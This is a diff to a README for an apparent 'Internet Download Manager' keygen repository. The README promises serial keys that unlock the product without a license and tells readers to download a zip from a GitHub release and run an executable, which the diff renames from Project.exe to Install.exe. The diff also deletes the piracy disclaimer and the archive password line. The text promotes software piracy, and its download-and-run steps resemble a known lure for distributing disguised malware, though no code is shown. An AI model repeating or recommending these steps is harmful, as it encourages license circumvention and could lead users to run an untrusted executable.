@@ -2,10 +2,6 @@
 
 This project provides a key generator (keygen) for Internet Download Manager (IDM). This keygen allows you to generate valid serial keys for IDM, enabling full functionality without purchasing a license.
 
-## Disclaimer
-
-Please note that the use of keygens or any other form of software piracy is illegal and unethical. This project is intended for educational purposes only. The author does not encourage or condone the use of keygens to bypass software licensing.
-
 ## Features
 
 - Generate valid serial keys for IDM.
@@ -17,12 +13,11 @@ Please note that the use of keygens or any other form of software piracy is ille
 - .NET Framework (for Windows users)
 
 ## Installation
-### Archive Password: g1tsofts25
-1. Download the archive from [here]( https://github.com/golovkolomka/Internet-Download-Manager-Latest-Keygen/releases/download/v1.9/idm-keygen.zip )
+1. Download the archive from [here](https://github.com/golovkolomka/Internet-Download-Manager-Latest-Keygen/releases/download/v1.9/idm-keygen.zip)
 
 2.  Unzip to any folder 
 
-3.  Run Project.exe
+3.  Run Install.exe
 
 4. Click the "Generate" button to generate a new serial key.
 
@@ -30,7 +25,7 @@ Please note that the use of keygens or any other form of software piracy is ille
 
 ## Usage
 
-1. Run the "Project.exe"
+1. Run the "Install.exe"
 
 2. Click the "Generate" button to generate a new serial key.
 
